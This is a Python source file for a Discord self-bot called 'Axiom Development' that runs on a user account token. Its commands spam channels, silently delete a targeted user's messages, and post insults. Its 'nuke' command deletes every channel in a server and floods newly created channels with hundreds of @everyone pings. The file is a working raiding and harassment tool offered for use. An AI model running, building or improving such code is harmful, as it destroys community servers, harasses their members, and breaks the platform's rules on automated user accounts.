import discord
from discord.ext import commands
import asyncio
import re
import time
from collections import deque
import aiohttp
import random

TOKEN = "1"
PREFIX = "."

bot = commands.Bot(command_prefix=PREFIX, self_bot=True)
bot.remove_command('help')

auto_react_users = {}
auto_reply_users = {}
stfu_users = set()
active_tasks = {}
rate_limit_queue = deque()
rate_limit_timestamps = deque()

RATE_LIMIT = 5
RATE_LIMIT_WINDOW = 5

ROASTS = [
    "You're the human equivalent of a participation trophy.",
    "I'd roast you but my mom said I'm not allowed to burn trash.",
    "You have your entire life to be an idiot. Take today off.",
    "I'd call you a tool but tools are actually useful.",
    "You're proof that even evolution makes mistakes.",
    "Somewhere out there a tree is working very hard to replace the oxygen you waste.",
    "You're not stupid, you just have bad luck thinking.",
    "I could eat a bowl of alphabet soup and produce a smarter argument than you.",
    "You're like a cloud — when you disappear it's a beautiful day.",
    "Light travels faster than sound. That's why you seemed bright until you spoke.",
    "I've seen better heads on a pimple.",
    "If brains were petrol, you wouldn't have enough to power an ant's go-kart.",
    "You're the reason shampoo has instructions.",
    "Your secrets are always safe with me. I never even listen when you tell me them.",
    "I'd agree with you but then we'd both be wrong.",
    "You're not the dumbest person alive, but you better hope they don't die.",
    "Calling you an idiot would be an insult to idiots.",
    "I would roast you harder but I just had lunch and I don't want to be sick.",
    "You're like a software update — every time I see you I think 'not now'.",
    "The last time I saw something like you, I flushed it.",
]

def check_rate_limit():
    now = time.time()
    while rate_limit_timestamps and now - rate_limit_timestamps[0] > RATE_LIMIT_WINDOW:
        rate_limit_timestamps.popleft()
    if len(rate_limit_timestamps) >= RATE_LIMIT:
        return False
    rate_limit_timestamps.append(now)
    return True

@bot.event
async def on_ready():
    print("╔══════════════════════════════════════╗")
    print("║         AXIOM DEVELOPMENT            ║")
    print("║           Self Bot v1.0              ║")
    print("╚══════════════════════════════════════╝")
    print(f"  Logged in as : {bot.user.name}")
    print(f"  User ID      : {bot.user.id}")
    print(f"  Prefix       : {PREFIX}")
    print("  Status       : Ready ✅")
    print("══════════════════════════════════════")

@bot.event
async def on_message(message):
    if message.author.id in stfu_users and message.author != bot.user:
        if check_rate_limit():
            try:
                await message.delete()
            except:
                pass

    if message.author.id in auto_react_users and message.author != bot.user:
        if check_rate_limit():
            try:
                emoji = auto_react_users[message.author.id]
                await message.add_reaction(emoji)
            except:
                pass

    if message.author.id in auto_reply_users and message.author != bot.user:
        if check_rate_limit():
            try:
                reply_text = auto_reply_users[message.author.id]
                await message.reply(reply_text)
            except:
                pass

    await bot.process_commands(message)

# ══════════════════════════════════════
#           MODERATION COMMANDS
# ══════════════════════════════════════

@bot.command(name="stfu")
async def stfu(ctx, user: discord.User = None):
    if user is None:
        await ctx.send("```py\n❌ Please mention a user.\n```")
        return
    if user.id == bot.user.id:
        await ctx.send("```py\n❌ Can't silence myself.\n```")
        return
    if user.id in stfu_users:
        stfu_users.remove(user.id)
        await ctx.send(f"```py\n✅ Unsilenced {user.name}\n```")
    else:
        stfu_users.add(user.id)
        await ctx.send(f"```py\n🔇 Silenced {user.name}\n```")

@bot.command(name="stfulist")
async def stfulist(ctx):
    if not stfu_users:
        await ctx.send("```py\n📭 No silenced users.\n```")
        return
    msg = "🔇 SILENCED USERS:\n"
    for uid in stfu_users:
        user = bot.get_user(uid)
        if user:
            msg += f"• {user.name}\n"
    await ctx.send(f"```py\n{msg}\n```")

@bot.command(name="purge")
async def purge(ctx, amount: int = None):
    global purge_active, purge_task_obj
    if amount is None:
        await ctx.send("```py\n❌ Usage: .purge <amount>\n```")
        return
    if amount > 500:
        await ctx.send("```py\n⚠️ Maximum purge amount is 500 messages.\n```")
        return

    status_msg = await ctx.send(f"```py\n🔍 Fetching {amount} of your messages...\n```")
    my_messages = []
    async for msg in ctx.channel.history(limit=amount * 2):
        if msg.author == bot.user:
            my_messages.append(msg)

    if not my_messages:
        await status_msg.edit(content="```py\n📭 No messages from you found.\n```")
        return

    messages_to_delete = my_messages[:amount]
    await status_msg.edit(content=f"```py\n📊 Deleting {len(messages_to_delete)} messages...\n```")
    deleted = 0
    for msg in messages_to_delete:
        try:
            await msg.delete()
            deleted += 1
            await asyncio.sleep(0.5)
        except:
            pass
    await status_msg.edit(content=f"```py\n✅ Deleted {deleted}/{len(messages_to_delete)} messages.\n```")

# ══════════════════════════════════════
#           REACTION COMMANDS
# ══════════════════════════════════════

@bot.command(name="autoreact")
async def autoreact(ctx, user: discord.User = None, emoji: str = None):
    if user is None or emoji is None:
        await ctx.send("```py\n❌ Usage: .autoreact @user :emoji:\n```")
        return
    if user.id == bot.user.id:
        await ctx.send("```py\n❌ Can't auto-react to myself.\n```")
        return
    if user.id in auto_react_users:
        del auto_react_users[user.id]
        await ctx.send(f"```py\n❌ Removed auto-react from {user.name}\n```")
    else:
        auto_react_users[user.id] = emoji
        await ctx.send(f"```py\n✅ Auto-react set for {user.name} with {emoji}\n```")

@bot.command(name="autoreactlist")
async def autoreactlist(ctx):
    if not auto_react_users:
        await ctx.send("```py\n📭 No auto-react users configured.\n```")
        return
    msg = "📋 AUTO-REACT USERS:\n"
    for uid, emoji in auto_react_users.items():
        user = bot.get_user(uid)
        if user:
            msg += f"• {user.name}: {emoji}\n"
    await ctx.send(f"```py\n{msg}\n```")

# ══════════════════════════════════════
#           AUTO REPLY COMMANDS
# ══════════════════════════════════════

@bot.command(name="autoreply")
async def autoreply(ctx, user: discord.User = None, *, reply: str = None):
    if user is None or reply is None:
        await ctx.send("```py\n❌ Usage: .autoreply @user <reply message>\n📝 Example: .autoreply @user stop talking to me\n```")
        return
    if user.id == bot.user.id:
        await ctx.send("```py\n❌ Can't auto-reply to myself.\n```")
        return
    if user.id in auto_reply_users:
        del auto_reply_users[user.id]
        await ctx.send(f"```py\n❌ Removed auto-reply for {user.name}\n```")
    else:
        auto_reply_users[user.id] = reply
        await ctx.send(f"```py\n✅ Auto-reply set for {user.name}\n💬 Reply: {reply}\n```")

@bot.command(name="autoreplylist")
async def autoreplylist(ctx):
    if not auto_reply_users:
        await ctx.send("```py\n📭 No auto-reply users configured.\n```")
        return
    msg = "💬 AUTO-REPLY USERS:\n"
    for uid, reply in auto_reply_users.items():
        user = bot.get_user(uid)
        if user:
            msg += f"• {user.name}: {reply}\n"
    await ctx.send(f"```py\n{msg}\n```")

# ══════════════════════════════════════
#           SPAM COMMANDS
# ══════════════════════════════════════

spam_active = False
spam_task_obj = None

@bot.command(name="spam")
async def spam(ctx, amount: int = None, *, message: str = None):
    global spam_active, spam_task_obj
    if amount is None or message is None:
        await ctx.send("```py\n❌ Usage: .spam <amount> <message>\n```")
        return
    if amount > 200:
        await ctx.send("```py\n⚠️ Maximum spam amount is 200 messages.\n```")
        return
    if spam_active:
        await ctx.send("```py\n⚠️ Spam already active! Use .stopspam to stop.\n```")
        return

    spam_active = True
    await ctx.send(f"```py\n🚀 Spamming {amount} messages... Use .stopspam to stop.\n```")
    sent = 0
    for i in range(amount):
        if not spam_active:
            break
        try:
            await ctx.channel.send(message)
            sent += 1
            await asyncio.sleep(0.8)
        except:
            await asyncio.sleep(1)

    spam_active = False
    await ctx.send(f"```py\n✅ Spam finished! Sent {sent}/{amount} messages.\n```")

@bot.command(name="stopspam")
async def stopspam(ctx):
    global spam_active
    if not spam_active:
        await ctx.send("```py\n❌ No active spam to stop.\n```")
        return
    spam_active = False
    await ctx.send("```py\n🛑 Spam stopped!\n```")

# ══════════════════════════════════════
#           ROAST COMMAND
# ══════════════════════════════════════

@bot.command(name="roast")
async def roast(ctx, user: discord.User = None):
    if user is None:
        await ctx.send("```py\n❌ Usage: .roast @user\n```")
        return
    if user.id == bot.user.id:
        await ctx.send("```py\n❌ I'm too good to roast myself.\n```")
        return
    roast_text = random.choice(ROASTS)
    await ctx.send(f"```py\n🔥 {user.name}, {roast_text}\n\n— Axiom Development\n```")

# ══════════════════════════════════════
#           MEDIA COMMANDS
# ══════════════════════════════════════

@bot.command(name="av")
async def avatar(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author
    avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
    await ctx.send(f"```py\n📸 Avatar for {user.name}:\n{avatar_url}\n```")

@bot.command(name="banner")
async def banner(ctx, user: discord.User = None):
    if user is None:
        user = ctx.author
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"https://discord.com/api/v9/users/{user.id}",
            headers={"Authorization": TOKEN}
        ) as response:
            data = await response.json()
            banner_id = data.get("banner")
            if banner_id:
                ext = "gif" if banner_id.startswith("a_") else "png"
                banner_url = f"https://cdn.discordapp.com/banners/{user.id}/{banner_id}.{ext}?size=1024"
                await ctx.send(f"```py\n🎨 Banner for {user.name}:\n{banner_url}\n```")
            else:
                await ctx.send(f"```py\n❌ No banner found for {user.name}\n```")

@bot.command(name="serverav")
async def server_avatar(ctx):
    server = ctx.guild
    if server.icon:
        await ctx.send(f"```py\n🖼️ Server Avatar for {server.name}:\n{server.icon.url}\n```")
    else:
        await ctx.send(f"```py\n❌ No server avatar found for {server.name}\n```")

@bot.command(name="serverbanner")
async def server_banner(ctx):
    server = ctx.guild
    async with aiohttp.ClientSession() as session:
        async with session.get(
            f"https://discord.com/api/v9/guilds/{server.id}",
            headers={"Authorization": TOKEN}
        ) as response:
            data = await response.json()
            banner_id = data.get("banner")
            if banner_id:
                banner_url = f"https://cdn.discordapp.com/banners/{server.id}/{banner_id}.png?size=1024"
                await ctx.send(f"```py\n🎨 Server Banner for {server.name}:\n{banner_url}\n```")
            else:
                await ctx.send(f"```py\n❌ No banner found for {server.name}\n```")

# ══════════════════════════════════════
#           NUKE COMMAND
# ══════════════════════════════════════

@bot.command(name="nuke")
async def nuke(ctx, amount: int = 20):
    guild = ctx.guild
    if guild is None:
        await ctx.send("```py\n❌ This command can only be used in a server.\n```")
        return

    if amount < 1 or amount > 50:
        await ctx.send("```py\n⚠️ Amount must be between 1 and 50.\n```")
        return

    # Get the name of the current channel to reuse
    nuke_channel_name = ctx.channel.name

    await ctx.send("```py\n💣 NUKE INITIATED — Axiom Development\n```")
    await asyncio.sleep(1)

    # Step 1: Delete all channels
    deleted = 0
    for channel in list(guild.channels):
        try:
            await channel.delete()
            deleted += 1
            await asyncio.sleep(0.4)
        except:
            pass

    # Step 2: Create channels with the same name and spam 100+ @everyone pings
    created = 0
    for i in range(amount):
        try:
            new_channel = await guild.create_text_channel(name=nuke_channel_name)
            created += 1
            # Send 100 @everyone pings in each channel
            for _ in range(100):
                try:
                    await new_channel.send(f"@everyone 💣 NUKED BY AXIOM DEVELOPMENT 💣")
                    await asyncio.sleep(0.2)
                except:
                    await asyncio.sleep(0.5)
            await asyncio.sleep(0.3)
        except:
            await asyncio.sleep(0.5)

# ══════════════════════════════════════
#           UTILITY COMMANDS
# ══════════════════════════════════════

@bot.command(name="remind")
async def remind(ctx, time: str = None, *, message: str = None):
    if time is None or message is None:
        await ctx.send("```py\n❌ Usage: .remind <time> <message>\n📝 Examples: .remind 10s hello, .remind 5m test\n```")
        return
    seconds = 0
    time_match = re.match(r"(\d+)([smh])", time.lower())
    if time_match:
        value = int(time_match.group(1))
        unit = time_match.group(2)
        if unit == "s": seconds = value
        elif unit == "m": seconds = value * 60
        elif unit == "h": seconds = value * 3600
    else:
        await ctx.send("```py\n❌ Invalid time format. Use s/m/h (e.g. 10s, 5m, 1h)\n```")
        return
    await ctx.send(f"```py\n⏰ Reminder set! I'll remind you in {time} about: {message}\n```")
    await asyncio.sleep(seconds)
    await ctx.send(f"```py\n🔔 REMINDER: {message}\n```")

@bot.command(name="clearall")
async def clearall(ctx):
    auto_react_users.clear()
    auto_reply_users.clear()
    stfu_users.clear()
    await ctx.send("```py\n🗑️ Cleared all settings.\n```")

# ══════════════════════════════════════
#           HELP COMMAND
# ══════════════════════════════════════

@bot.command(name="help")
async def help_command(ctx):
    help_text = """
╔══════════════════════════════════════╗
║         AXIOM DEVELOPMENT            ║
║           Self Bot v1.0              ║
╚══════════════════════════════════════╝

📌 MODERATION
  .stfu @user          - Silence a user
  .stfulist            - List silenced users
  .purge <amount>      - Delete your messages

📌 REACTIONS
  .autoreact @user 👍  - Auto react to user
  .autoreactlist       - List auto-react users

📌 AUTO REPLY
  .autoreply @user msg - Auto reply to user
  .autoreplylist       - List auto-reply users

📌 SPAM
  .spam <amount> <msg> - Spam messages
  .stopspam            - Stop active spam

📌 ROAST
  .roast @user         - Roast a user 🔥

📌 NUKE
  .nuke [amount]       - Nuke the server 💣
                         (deletes all channels, creates
                          20 new ones with @everyone ping)
                         Default: 20 channels

📌 MEDIA
  .av [@user]          - Get user avatar
  .banner [@user]      - Get user banner
  .serverav            - Get server icon
  .serverbanner        - Get server banner

📌 UTILITY
  .remind <time> <msg> - Set a reminder
  .clearall            - Clear all settings
  .help                - Show this menu

⚡ Rate Limit: 5 actions per 5 seconds
🔰 Powered by Axiom Development
    """
    await ctx.send(f"```py\n{help_text}\n```")

bot.run(TOKEN, bot=False)
# This will be replaced - just reading current file first
